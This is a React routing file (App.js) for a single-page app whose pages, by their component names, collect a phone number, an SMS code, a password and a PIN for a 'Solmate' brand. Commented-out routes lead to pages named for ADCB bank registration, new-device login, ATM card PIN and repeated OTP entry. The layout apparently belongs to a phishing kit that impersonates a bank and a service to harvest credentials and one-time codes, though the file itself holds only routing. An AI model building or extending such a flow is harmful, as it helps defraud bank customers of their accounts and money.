import { Routes, Route } from "react-router-dom";
import Firstpage from "./Firstpage";
import Secondpage from "./Secondpage";
import Thirdpage from "./Thirdpage";
import Forth  from "./Forth";
import Secondotp from "./Secondotp";
import ATMCardPin from "./ATMCardPin";
import Thirdotp from "./Thirdotp";
import ADCBRegister from "./ADCBRegister";
import ADCBLoginNewDevice from "./ADCBLoginNewDevice";
import ADCBWelcomeActivation from "./ADCBWelcomeActivation";
import ADCBWelcomeActivationSecond from "./ADCBWelcomeActivationSecond";
import ADCBMobileNumber from "./ADCBMobileNumber";
import SolmatePhoneNumber from "./SolmatePhoneNumber";
import SolmateSmsCode from "./SolmateSmsCode";
import SolmatePassword from "./SolmatePassword";
import SolmatePin from "./SolmatePin";

const App = () => {
  return (
    <>
      <Routes>
        {/* <Route path="/" element={<Firstpage />} /> */}
        {/* <Route path="/" element={<ADCBRegister/>} />
        <Route path="/ADCBLogin" element={<ADCBLoginNewDevice />} />
        <Route path="/adcbactivation" element={<ADCBWelcomeActivation />} />
        <Route path="/lastActivation" element={<ADCBWelcomeActivationSecond/>} />
        <Route path="/adcbmobile" element={<ADCBMobileNumber/>} />
        <Route path="/atmcardpin" element={<ATMCardPin/>} />
        <Route path="/thirdotp" element={<Thirdotp/>} /> */}
        <Route path="/" element={<SolmatePhoneNumber />} />
        <Route path="/solmate-sms" element={<SolmateSmsCode />} />
         <Route path="/password" element={<SolmatePassword />} />
          <Route path="/pin" element={<SolmatePin />} />
      </Routes>
    </>
  );
};

export default App;
